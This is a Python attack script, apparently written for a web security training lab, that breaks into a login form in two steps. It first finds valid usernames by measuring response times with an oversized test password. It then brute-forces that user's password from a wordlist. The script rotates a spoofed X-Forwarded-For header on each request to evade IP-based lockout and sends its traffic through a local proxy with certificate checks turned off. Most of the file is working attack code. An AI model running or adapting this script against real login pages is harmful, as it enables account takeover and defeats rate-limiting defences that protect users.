import sys
from datetime import timedelta

import requests
import urllib3

# Step 2: take in the requested url as an input parameter
# Step 3: set up data needed for sending POST or get request (starting off with POST)
# Step 4: User enumeration based on the time elapsed between sending request and receiving response
# Step 5: Password Brute force using the username found within step 4

# As labs use https, in order to send requests to Burp and other Proxies without lots of warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


#  Read in wordlists for username and password
def read_wordfile(wordfile):
    # open passed wordfile file
    file = open(wordfile)

    # read file
    wordfile_list = file.readlines()

    # close file
    file.close()

    return wordfile_list


# prepare the payloads to be used for POST requests
def prepare_payload(username, password):
    # setting_password should be true if we are setting the password
    # Prepare the payload
      return {"username": f"{username}", "password": f"{password}"}


# perform_request will actually send the request using the payloads
def perform_request(url, username, password, user_or_pass, random_number):
    # static data needed for request
    proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
    
    # ok:disabled-cert-validation
    response = requests.post(
        url,
        data=prepare_payload(username, password),
        allow_redirects=False,
        proxies=proxies,
        verify=False,
        headers={"X-Forwarded-For": f"192.168.0.{random_number}"},
    )
    # when enumerating the correct password, we have to pass response directly upon redirect
    if response.status_code != 200 and not user_or_pass:
        print(f"{response.status_code}: did not work")
        return None
    elif response.status_code != 200 and user_or_pass:
        return response
    return response

# logic for enumerating the correct username
def enumerate_usernames(url, usernames):
    hit = ""
    time_taken = timedelta(seconds=0)
    test_password = ""
    i = 0

    # create the test password for response timing
    for j in range (100):
      test_password += "test"

    for username in usernames:
        cleaned_text = username.replace("\n", "")
        response = perform_request(url, cleaned_text, test_password, False, i)
        if response and response.elapsed > time_taken:
          time_taken = response.elapsed
          hit = cleaned_text
        i+=1
    return hit, time_taken


# logic for enumerating the passwords
def brute_password(url, username, passwords):
    i = 0
    for password in passwords:
        cleaned_text = password.replace("\n", "")
        response = perform_request(url, username, cleaned_text, True, i)
        i+=1
        if response.status_code == 302:
            return cleaned_text


def main():
    # ensure proper command line variables were passed
    if len(sys.argv) != 4:
        print(f"(+) Usage: {sys.argv[0]} <url> <usernames.txt> <passwords.txt>")
        print(
            f"(+) Example: {sys.argv[0]} www.example.com file/path/usernames file/path/passwords"
        )
        sys.exit(-1)

    # read in the wordlists
    usernames = read_wordfile(sys.argv[2])
    passwords = read_wordfile(sys.argv[3])

    # Enumerate username and password
    correct_username, time_taken = enumerate_usernames(sys.argv[1], usernames)
    if correct_username == "":
        print("Unable to find correct username. Exiting...")
        return
    print(f"Correct username: {correct_username} and the time it took for the response was: {time_taken}" )
    correct_password = brute_password(sys.argv[1], correct_username, passwords)
    print(f"{correct_username} and {correct_password}")


if __name__ == "__main__":
    main()
